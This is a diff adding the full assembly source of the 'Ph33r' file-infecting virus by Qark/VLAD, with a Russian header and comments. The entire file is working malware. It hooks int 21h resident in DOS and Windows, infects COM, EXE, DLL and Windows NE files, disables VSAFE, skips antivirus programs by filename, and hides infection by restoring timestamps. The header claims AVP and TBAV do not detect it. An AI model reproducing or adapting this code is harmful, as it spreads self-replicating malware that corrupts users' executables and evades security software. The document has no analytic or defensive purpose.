@@ -1,0 +1,878 @@
+;▄▄                   ▄
+;▀▀▀ STEALTH GROUP WW █ Mail:   BOX 15, 125080 MOSCOW   ████████ █████████ █▀▀█
+;▀██ ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ █ ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ ▀ ▀▀▀▀▐▀▀▀   ┌─┐┬ ┬┌─┤┬ ┬ ╥ ┬┐┌ █▄▄█
+; ▐█ █▀▄ █▀▀ ▄▀▀ ▄▀▀ ▄█▄ ▄▀▀ █▀█   ▌ █ ▄▀█ █ ▄▀▀ █▄▄    ├┬┘│ │└─┐├─┤   │└┤ ▄  █
+;  █ █ █ █▀  █▀  █    █  █▀  █ █   █ █ █ █ █ █   █      ┴└─└─┘└─┘┴ ┴   ┴ ┴ ▀▀▀▀
+;  █ ▐ ▐ ▐   ▐▄▄ ▐▄▄  ▐  ▐▄▄ ▐▄▀    ▀█ ▀▄█ ▐ ▐▄▄ ▐▄▄▄   ████  WINTER ' 96  ████
+;  ▐ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ███████████████████████
+;
+;   █████████████ МЕЛКОМЯГКИЕ ОКНА ██████████████ 
+;
+;
+;                        Ph33r
+;
+;                      Qark/VLAD
+;
+;
+;
+; Это первый DOS/Windows вирус, инфицирующий COM/EXE/WinEXE файлы.
+; Данная технология позволяет вирусу находиться в резиденте, не заражая
+; оболочки Windows. Точка входа вируса в части, относящейся к Windows,
+; выделяет память, указывает на нее селектор, копирует вирус туда и устанавли-
+; вает int 21h на резидентную часть. Соблюдая аккуратность, стало возможным
+; разделение одного и того же кода обработчиком int 21h DOS и Windows.
+;
+; Интересные штучки:
+;       Выключает MSAV (DOS)
+;       Получает оригинальное Int 21h используя DOSSEG:109Eh (DOS)
+;       Не заражает файлы, заканчивающиеся на 'AV' 'AN' 'OT' (DOS & Win)
+;
+; Глюки:
+;       Окна бьются при загрузке, если перехвачена функция AH=3Dh Int21h,
+;       а также при заражении WIN386.EXE.
+; Мы избежали этих глюков.
+;
+; Непонятно почему, вирус вешает debug при выходе.
+;
+; AVP & TBAV ничего не обнаруживают, F-Prot детектирует эвристическим анализатором.
+;
+; Проблемы с запуском. Компилируется в EXE.
+;
+
+	.model tiny
+	.code
+	.386p
+        org     0
+start:
+com_entry:                              ;Здесь начинается выполнение COM файла
+        call    exec_start
+        push    es
+        pop     ds
+
+        ;Выход из COM-файла
+
+        mov     di,100h
+        push    di
+
+        db      0b8h                    ;MOV AX,xxxx
+old2    dw      20cdh
+        stosw
+        db      0b8h                    ;MOV AX,xxxx
+old4    dw      0
+        stosw
+        
+        xor     ax,ax
+        xor     bx,bx
+        xor     cx,cx
+        xor     dx,dx
+        xor     si,si
+        xor     di,di
+        ret
+
+exe_entry:                              ;Точка входа EXE
+        call    exec_start
+        push    es
+        pop     ds
+        
+        ;Setup ss:sp
+        mov     ax,ds
+        add     ax,10h
+        db      5                       ;ADD AX,xxxx
+old_ss  dw      0
+        mov     ss,ax
+        db      0bch                    ;MOV SP,xxxx
+old_sp  dw      0
+
+        ;setup the return
+        mov     ax,ds
+        add     ax,10h
+        db      5                       ;ADD AX,xxxx
+exe_cs  dw      0
+        push    ax
+        db      0b8h                    ;MOV AX,xxxx
+exe_ip  dw      0
+        push    ax
+        xor     ax,ax
+        xor     bx,bx
+        xor     cx,cx
+        xor     dx,dx
+        xor     si,si
+        xor     di,di
+        retf
+
+Exec_Start:
+        
+        cld
+        mov     ax,51ffh                ;Проверка на себя в памяти
+        int     21h
+        cmp     ax,0ff51h
+        je      exit_virus
+
+        mov     ax,0fa02h               ;Убить VSAFE!
+        mov     dx,5945h                ;Каждый юзер DOS6+ имеет VSAFE
+        xor     bl,bl
+        int     16h
+        
+					; отгрызаем память
+        mov     ax,ds
+        dec     ax
+        mov     ds,ax                   ;MCB seg in DS.
+        xor     di,di
+        cmp     byte ptr [di],'Y'       ;Z block ?
+        ja      allocate
+exit_virus:
+        ret
+allocate:
+        sub     word ptr [di+3],((offset virus_size-start)*2/16)+1
+        sub     word ptr [di+12h],((offset virus_size-start)*2/16)+1
+        mov     ax,word ptr [di+12h]
+
+        push    es
+        mov     es,ax
+        push    cs
+        pop     ds
+        mov     cx,offset virus_size
+
+        ;Get delta offset in SI
+        call    next
+next:
+        pop     si
+        sub     si,offset next
+
+        				;Переносим вирус в выделенную память	
+        rep     movsb
+
+        mov     ds,cx                   ;DS=CX=0 from REP MOVSB
+
+				        ;Перехватываем int21h
+        mov     si,21h*4
+        mov     di,offset i21
+        push    si
+        movsw
+        movsw
+        pop     si
+        mov     di,offset orig21
+        movsw
+        movsw
+
+        mov     word ptr [si-4],offset int21handler
+        mov     word ptr [si-2],es
+
+        push    es
+        mov     ah,52h                  ;Thanx Neurobasher!
+        int     21h
+        mov     ax,es
+        pop     es
+        mov     ds,ax
+
+        mov     si,109eh                ;DS:109Eh = Original Int 21 I hope.
+        lodsw
+        cmp     ax,9090h
+        jne     reset21
+        lodsb
+        cmp     al,0e8h
+        jne     reset21
+        mov     word ptr es:orig21,10a0h
+        mov     word ptr es:orig21+2,ds
+reset21:
+        pop     es
+        ret
+
+        db      '=Ph33r='
+
+win21:                          ;Обработчик int21h для Windows 
+        cmp     ax,51feh
+        jne     non_w_res
+        xchg    al,ah
+        iret
+non_w_res:
+        cmp     ax,4b00h                ;Execute
+        je      check_infect
+        cmp     ah,3dh                  ;File Open
+        je      check_infect
+        cmp     ah,56h                  ;Rename
+        je      check_infect
+        cmp     ah,43h                  ;Chmod
+        jne     int_exit
+
+check_infect:
+        pushf
+        pusha
+        push    ds
+        push    es
+        
+        mov     ax,0ah            ;Разрешаем запись в наш CS
+        mov     bx,cs
+        int     31h
+        mov     es,ax
+
+        call    setup_infect
+
+        pop     es
+        pop     ds
+        popa
+        popf
+        
+        jmp     int_exit
+
+int21handler:                    ;Обработчик int21h для DOS
+        cmp     ax,51ffh
+        jne     non_res
+        xchg    al,ah
+        iret
+
+        db      'Qark/VLAD'
+
+non_res:
+;Странно, но проверка на AH=3dh "бьет окна" при их запуске.
+
+        cmp     ax,4b00h                ;Execute.
+        je      do_file
+        cmp     ah,6ch                  ;Open.
+        je      do_file
+        cmp     ah,56h                  ;Rename.
+        je      do_file
+        cmp     ah,43h                  ;Chmod.
+        je      do_file
+
+int_exit:
+        db      0eah
+i21     dd      0
+
+do_file:
+        push    es
+        push    dx
+        cmp     ah,6ch
+        jne     no_6c_fix
+        mov     dx,si
+no_6c_fix:
+        push    cs
+        pop     es
+        call    setup_infect
+        pop     dx
+        pop     es
+                
+        jmp     int_exit
+
+setup_infect:			; общая процедура заражения для DOS и Windows
+;На входе es=cs (разрешенный для записи)
+;ds:dx=filename
+        pushf
+        push    ax
+        push    bx
+        push    cx
+        push    dx
+        push    si
+        push    di
+        push    ds
+        push    es
+        cld
+        mov     si,dx
+asciiz:
+        lodsb
+        cmp     al,0
+        jne     asciiz
+        sub     si,4
+        lodsw
+        or      ax,2020h
+        cmp     ax,'xe'                 ;EXE	Наши клиенты
+        je      do_inf
+        cmp     ax,'ld'                 ;DLL
+        je      do_inf
+        cmp     ax,'oc'                 ;COM
+        jne     not_name
+do_inf:
+        cmp     word ptr [si-5],'68'    ;Не заражайте WIN386.EXE (висит)
+        je      not_name
+        mov     ax,word ptr [si-5]
+        or      ax,2020h                ;перевод в нижний регистр
+					;Не тронь говна - вонять не будет.
+					;*AV,*AN,*OT (TBAV,SCAN,FPROT)
+        cmp     ax,'va'                
+        je      not_name               
+        cmp     ax,'vd'                 ;DV.COM checks DV.EXE
+        je      not_name
+        cmp     ax,'na'        
+        je      not_name       
+        cmp     ax,'to'        
+        je      not_name       
+
+        call    infect
+not_name:
+        pop     es
+        pop     ds
+        pop     di
+        pop     si
+        pop     dx
+        pop     cx
+        pop     bx
+        pop     ax
+        popf
+
+        ret
+
+Infect:
+;DS:DX=Filename, ES=наш сегмент данных
+        cld
+        mov     ax,3d02h                ;Открыть клиента
+        call    int21h
+        jnc     file_opened
+        ret
+file_opened:
+        xchg    bx,ax                   ;Хендл в BX
+        push    es
+        pop     ds
+  
+        mov     ah,3fh                  ;Прочесть 512 байт с начала
+        mov     cx,512
+        mov     dx,offset virus_size
+        call    int21h
+
+        mov     si,offset virus_size
+        
+        mov     ax,word ptr [si]
+        or      ax,2020h
+        cmp     ax,'zm'                 ;Проверка заголовка EXE "MZ"
+        je      check_exe
+        jmp     com_infect
+check_exe:
+        cmp     word ptr [si+12h],0afafh     ;Признак заражения (контрольная
+        jne     not_infected	             ; сумма)
+bad_mem:
+        jmp     com_end
+not_infected:
+        cmp     word ptr [si+18h],40h        ;Windows EXE 
+        jb      exe_infect
+        jmp     windows_infect
+exe_infect:
+					     ;обычный EXE
+        cmp     word ptr [si+0ch],-1         ;Maxmem = вся - не заражаем
+        jne     bad_mem
+        
+        call    lseek_end                    ;Получить длину файла в DX:AX
+        or      dx,dx
+        jnz     ok_exe_size
+        cmp     ax,1000			     ;Файлы меньше 4K не заражаем
+        jb      bad_mem
+ok_exe_size:
+        mov     cx,512
+        div     cx
+        inc     ax
+        cmp     [si+4],ax                    ;Проверка на оверлейность
+        ja      bad_mem
+
+        mov     ax,word ptr [si+0eh]         ;Сохраним оригинальный SS:SP
+        mov     word ptr old_ss,ax
+        mov     ax,word ptr [si+10h]
+        mov     word ptr old_sp,ax
+
+        mov     ax,word ptr [si+14h]         ;Сохраним оригинальный CS:IP
+        mov     word ptr exe_ip,ax
+        mov     ax,word ptr [si+16h]
+        mov     word ptr exe_cs,ax
+
+        call    lseek_end
+        mov     cx,16
+        div     cx
+
+        sub     ax,word ptr [si+8]
+        add     dx,offset exe_entry
+        mov     word ptr [si+14h],dx    ;New IP
+        mov     word ptr [si+16h],ax    ;New CS
+        
+        dec     ax
+        mov     word ptr [si+0eh],ax
+        add     dx,1500
+        and     dx,0fffeh
+        mov     word ptr [si+10h],dx
+
+        call    save_time
+
+        mov     cx,offset virus_size	; Пишем вирус в файл
+        mov     ah,40h
+        xor     dx,dx
+        call    int21h
+					; Изменяем заголовок
+        call    lseek_end
+
+        mov     cx,512
+        div     cx
+        or      dx,dx
+        jz      no_page_fix
+        inc     ax
+no_page_fix:
+        mov     word ptr [si+4],ax
+        mov     word ptr [si+2],dx
+        call    lseek_start
+        
+        mov     word ptr [si+12h],0afafh        ;Установим признак заражения
+        mov     ah,40h
+        mov     dx,si
+        mov     cx,1ch
+        call    int21h
+
+        call    restore_time
+
+        jmp     com_end
+
+com_infect:				;Заражение COM-файла. NO COMMENTS...
+        cmp     byte ptr [si+3],0afh    ;Com infection marker.
+        je      com_end
+
+        ;Save first four com file bytes.
+        mov     di,offset old2
+        movsw
+        mov     di,offset old4
+        movsw
+        
+        mov     ax,4202h                ;Lseek to file end.
+        xor     cx,cx
+        cwd
+        call    int21h
+
+        or      dx,dx                   ;Check if > 64k
+        jnz     com_end
+        cmp     ax,60000                ;Check if > 60000
+        ja      com_end
+        cmp     ax,1024
+        jb      com_end
+
+        sub     ax,3
+        mov     word ptr com_jmp+1,ax
+
+        call    save_time
+
+        mov     ah,40h                  ;Write virus body to file.
+        mov     cx,offset virus_size
+        xor     dx,dx
+        call    int21h
+        jc      com_end
+
+        mov     ax,4200h                ;Lseek to file start.
+        xor     cx,cx
+        cwd
+        call    int21h
+
+        mov     ah,40h                  ;Write jump to start of file.
+        mov     cx,4
+        mov     dx,offset com_jmp
+        call    int21h
+
+com_time_end:
+        call    restore_time
+
+com_end:
+        mov     ah,3eh                  ;Close file.
+        call    int21h
+
+        ret
+
+;------------------------------------ ЗАРАЖЕНИЕ WINDOWS EXE !!!
+windows_infect:	
+
+        push    word ptr [si+3ch]    ;сохраним указатель на заголовок NewEXE
+				     ;Он находится по смещению 3Ch (dd)
+				     ;в заголовке
+        pop     word ptr newexe_off
+        sub     word ptr [si+3ch],8
+        cmp     word ptr [si+3eh],0   ;Не будем работать с заголовком NE,
+				      ;расположенным дальше 64k
+        jne     com_end
+        
+        mov     word ptr [si+12h],0afafh        ;Признак заражения
+          				        ;Назад, в начало файла
+        mov     ax,4200h
+        xor     cx,cx
+        cwd
+        call    int21h
+
+        call    save_time
+
+				      ;Записываем старый заголовок в файл
+        mov     ah,40h
+        mov     cx,512
+        mov     dx,offset virus_size
+        call    int21h
+        
+        jc      com_end
+
+     				      ; Переходим на заголовок NewEXE
+        mov     ax,4200h
+        mov     dx,word ptr newexe_off
+        xor     cx,cx
+        call    int21h
+				        ;Считываем заголовок NewEXE
+        mov     ah,3fh
+        mov     cx,512
+        mov     dx,offset virus_size	; Сразу после тела вируса
+        call    int21h
+				        ;Выравниваем указатели на таблицы
+
+        mov     ax,word ptr [si+22h]    ;AX=Смещение Таблицы Сегментов 
+					;относительно начала заголовка
+        cmp     word ptr [si+4],ax      ; Смещение Таблицы входов раньше Т.С. ?
+        jb      ok_et
+        add     word ptr [si+4],8	; Нет - увеличиваем на 8 смещение таблицы
+					; входов
+					; Увеличиваем на 8 смещения таблиц,
+					; если они стоят после удлиняемой нами
+					; Таблицы Сегментов
+ok_et:
+        cmp     word ptr [si+24h],ax	; смещ. таблицы ресурсов
+        jb      ok_rt
+        add     word ptr [si+24h],8	
+ok_rt:
+        cmp     word ptr [si+26h],ax	; смещ. табл. резидентного имени
+        jb      ok_rnt
+        add     word ptr [si+26h],8
+ok_rnt:
+        cmp     word ptr [si+28h],ax	; смещ. табл. ссылок на модули
+        jb      ok_mrt
+        add     word ptr [si+28h],8
+ok_mrt:
+        cmp     word ptr [si+2ah],ax	; смещ. табл. импортируемых имен
+        jb      ok_int
+        add     word ptr [si+2ah],8
+ok_int:					; INC число входов в Таб.Сег.
+        mov     ax,word ptr [si+1ch]    
+        inc     word ptr [si+1ch]      
+        xor     dx,dx
+        mov     cx,8
+        mul     cx
+
+        add     ax,word ptr [si+22h]   	;AX=Смещение конца Таблицы Сегментов
+					;относительно начала заголовка
+        adc     dx,0
+        mov     cx,512                  ; Порции заголовка до конца Т.С. 
+					; по 512 байт для последующего чтения
+        div     cx
+
+        mov     word ptr ne_size,ax	; Размер заголовка в 512б блоках
+        mov     word ptr last_ne,dx	; Остаток от 512
+
+					; Сохраняем старое CS:IP
+        push    word ptr [si+14h]	; IP
+        pop     word ptr old_ip
+        push    word ptr [si+16h]	; CS
+        pop     word ptr old_cs
+
+	;Сохраняем множитель смещений, использующийся при размещении логических
+	;секторов, по умолчанию =9,  2^9=512
+	;Он пригодится нам для вычисления смещения нашего сегмента при 
+	;записи нашего CS:IP
+        push    word ptr [si+32h]	; множитель...
+        pop     word ptr al_shift
+
+        ;Указываем CS:IP на вирус
+        mov     word ptr [si+14h],offset win_entry      ;The new IP
+        mov     ax,word ptr [si+1ch]
+        mov     word ptr [si+16h],ax                    ;The new CS
+
+        push    word ptr newexe_off	; Указатель на заголовок NewEXE
+        pop     word ptr lseek
+
+	;Нижеприведенный код сдвигает заголовок NE на 8 байт вперед порциями 
+        ;по 512 байт
+
+move_header_forward:
+        mov     ax,word ptr ne_size	;Размер заголовка NE в 512б блоках
+        or      ax,ax			;кончился ?
+        jz      last_page
+
+        dec     word ptr ne_size	;следующий 512б блок
+
+        mov     ax,4200h                ;FSeek на текущую позицию
+        xor     cx,cx
+        mov     dx,word ptr lseek
+        sub     dx,8			;На 8 байт к началу
+        call    int21h
+
+        mov     ah,40h                  ;Пишем кусок заголовка
+        mov     cx,512
+        mov     dx,si
+        call    int21h
+
+        add     word ptr lseek,512
+
+        mov     ax,4200h                ;На следующий 512б кусок
+        xor     cx,cx
+        mov     dx,word ptr lseek
+        call    int21h
+
+        mov     ah,3fh                  ;Читаем его.
+        mov     dx,offset virus_size
+        mov     cx,512
+        call    int21h
+
+        jmp     move_header_forward
+
+last_page:				; Заголовок закончен.
+        mov     ax,4202h                ; Указатель в конец файла
+        xor     cx,cx
+        cwd				; здесь = 'xor dx,dx'
+        call    int21h                  ; Вернет длину файла в DX:AX
+
+        ;DX:AX=Смещение нашего сегмента в файле (EOF)
+
+	;Нижеприведенный код  изменяет смещение сегмента с учетом множителя
+	
+        mov     cl,byte ptr al_shift
+        push    bx
+        mov     bx,1
+        shl     bx,cl
+        mov     cx,bx
+        pop     bx
+        div     cx			; AX /остаток в DX/ = размер файла в
+					; "логических секторах" или страницах
+
+        mov     word ptr lseek_add,0	;
+        or      dx,dx			
+        jz      no_extra
+        sub     cx,dx			; 512(или 2^Множитель)-неполная стр.
+        mov     word ptr lseek_add,cx
+        inc     ax			; + страница
+no_extra:
+        mov     di,si			; SI=смещение считанного заголовка NE
+        add     di,word ptr last_ne     ; Конец заголовка.
+
+	      		       ;Дальше начинается таблица сегментов
+			       ;Добавляем новый элемент в таблицу сегментов в
+			       ;освободившиеся 8 байт
+
+        mov     word ptr [di],ax        ;Смещение логического сектора в байтах
+					;относительно начала файла
+        mov     word ptr [di+2],offset virus_size  ; длина сегмента в файле
+					; 0= 64кб, если смещение не 0
+
+					; Таб.Сег.+ 4 (2 байта)
+        mov     word ptr [di+4],180h     ; Аттрибут сегмента (бит=1 иначе 0)
+				  ;0	 ; 0 = сегмент данных (иначе кода)
+				  ;0	 ; 1 = в загрузчике имеется память,
+				  	 ;     отведенная для сегмента
+				  ;0	 ; 2 = сегмент загружен 
+				  ;0	 ; 3 = зарезервировано
+				  ;0	 ; 4 = MOVABLE иначе FIXED сегмент
+				  ;0	 ; 5 = PURE или SHARABLE сегмент,
+				 	 ;     иначе IMPURE или NONSHARABLE
+				  ;0	 ; 6 = PRELOAD, иначе LOADONCALL
+				  ;1	 ; 7 = для сегмента кода: EXECUTEONLY
+					 ;   = для сегмента данных: READONLY
+				  ;1	 ; 8 = имеются перемещаемые данные
+				  ;0	 ; 9 = подстраивающийся
+				  ;0,0	 ; A,B = зарезервировано
+				  ;0	 ; C = сбрасываемый (Discardable)
+				  ;0,0,0 ; D,E,D = зарезервировано
+
+        mov     word ptr [di+6],offset virus_size+512	; мин. обьем в байтах,
+					 ; необходимый для размещения сегмента
+					 ; 0 = 64Kb
+
+        mov     ax,4200h                ;
+        xor     cx,cx
+        mov     dx,word ptr lseek
+        sub     dx,8
+        call    int21h
+
+        mov     ah,40h          ; Записываем остаток (от 512) заголовка NE
+				; + новый элемент таблицы сегментов
+        mov     cx,word ptr last_ne	; размер остатка заголовка
+        add     cx,8            	; + 8 байт для нового элемента
+        mov     dx,offset virus_size
+        call    int21h
+
+			        ;Сбрасываем наш перемещаемый элемент
+        push    word ptr winip
+        push    word ptr wincs
+        mov     word ptr winip,0
+        mov     word ptr wincs,0ffffh
+
+        mov     ax,4202h                ;Переходим в конец файла
+        xor     cx,cx
+        mov     dx,word ptr lseek_add
+        call    int21h
+
+        mov     ah,40h                  ;Пишем тело вируса в файл
+        mov     cx,offset virus_size
+        xor     dx,dx
+        call    int21h
+
+        pop     word ptr wincs
+        pop     word ptr winip
+
+        mov     ah,40h                  ;Записываем наш перемещаемый элемент
+					;в файл
+        mov     cx,offset reloc_end - offset relocblk
+        mov     dx,offset relocblk
+        call    int21h
+
+        jmp     com_time_end		;Ну вот и все. Разобрался.
+
+int21h:                                 ;Simulated int 21 call.
+        pushf
+        call    dword ptr cs:orig21
+        ret
+orig21  dd      0
+
+win_entry: ;---------------------------;Отсюда начинает выполняться WinEXE 
+        pusha
+        push    ds
+        push    es
+
+        mov     ax,51feh                ;Самопроверка вируса в памяти
+        int     21h
+        cmp     ax,0ff51h
+        je      no_wintsr
+        
+        mov     ax,000ah                ;Разрешаем сегмент кода для записи
+        mov     bx,cs
+        int     31h                     ;Используем DPMI.
+        mov     ds,ax
+
+        mov     ax,0204h                ;Получить вектор прерывания реального режима
+        mov     bl,21h
+        int     31h
+
+        mov     word ptr i21,dx         ;Сохранить int21h
+        mov     word ptr i21+2,cx
+
+        mov     word ptr orig21,dx
+        mov     word ptr orig21+2,cx
+
+        mov     ax,501h
+        xor     bx,bx                   ;Выделить линейную область
+        mov     cx,offset v_mem_size
+        int     31h
+
+        push    bx
+        push    cx
+
+        xor     ax,ax
+        mov     cx,1                    ;Создать селектор
+        int     31h
+
+        mov     bx,ax
+        mov     ax,7
+        pop     dx                      ;Указать его на выделенную область
+        pop     cx
+        int     31h
+
+        mov     ax,8
+        xor     cx,cx                   ;Предел селектора
+        mov     dx,offset v_mem_size
+        int     31h
+
+        mov     es,bx
+        mov     cx,offset v_mem_size
+        xor     si,si                   ;Скопировать вирус в выделенную область
+        xor     di,di
+        cld
+        rep     movsb
+
+        mov     bx,es
+        mov     ax,9                    ;Установить права доступа как 'Code'
+        mov     cx,0ffh
+        int     31h
+
+        mov     cx,es
+        mov     dx,offset win21
+        mov     ax,205h
+        mov     bl,21h
+        int     31h                     ;Установить вектор реального режима
+
+        mov     ax,4
+        push    es
+        pop     bx                      ;Закрыть селектор
+        int     31h
+
+no_wintsr:
+        pop     es
+        pop     ds
+        popa
+
+        db      0eah                    ;Вернуться в оригинальный файл
+winip   dw      0
+wincs   dw      0ffffh
+
+;-----------------------
+;Infection Procedures
+;-----------------------
+Save_Time:
+        push    ax
+        push    cx
+        push    dx
+
+        mov     ax,5700h
+        call    int21h
+
+        mov     word ptr time,cx
+        mov     word ptr date,dx
+
+        pop     dx
+        pop     cx
+                                                                                pop     ax
+        ret
+
+Restore_Time:
+        push    ax
+        push    cx
+        push    dx
+
+        db      0bah            ;MOV DX,xxxx
+        date    dw      0
+
+        db      0b9h            ;MOV CX,xxxx
+        time    dw      0
+
+        mov     ax,5701h
+        call    int21h
+
+        pop     dx
+        pop     cx
+        pop     ax
+        ret
+
+Lseek_Start:
+        mov     al,0
+        jmp     short lseek2
+Lseek_End:
+        mov     al,2
+lseek2:
+        mov     ah,42h
+        xor     cx,cx
+        cwd
+        call    int21h
+        ret
+
+;-----------------------
+;Infection Data
+;-----------------------
+;Com infection data.
+com_jmp         db      0e9h,0,0,0afh
+
+;-----------------------
+;Windows infection data.
+newexe_off      dw      0
+al_shift        dw      0
+ne_size         dw      0
+last_ne         dw      0
+lseek           dw      0
+lseek_add       dw      0
+
+Relocblk:		;Перемещаемый блок
+        dw      1       ;Количество перемещаемых элементов
+
+        db      3       ;32-битный указатель перемещаемого элемента
+        db      4       ;Добавлять к элементу адрес
+        dw      offset winip
+old_cs  dw      0       ;Оригинальный  CS & IP программы-носителя
+old_ip  dw      0
+
+
+Reloc_end:
+;-----------------------
+
+virus_size:
+        db      512 dup (0)     ;Буфер
+v_mem_size:
+end start
+
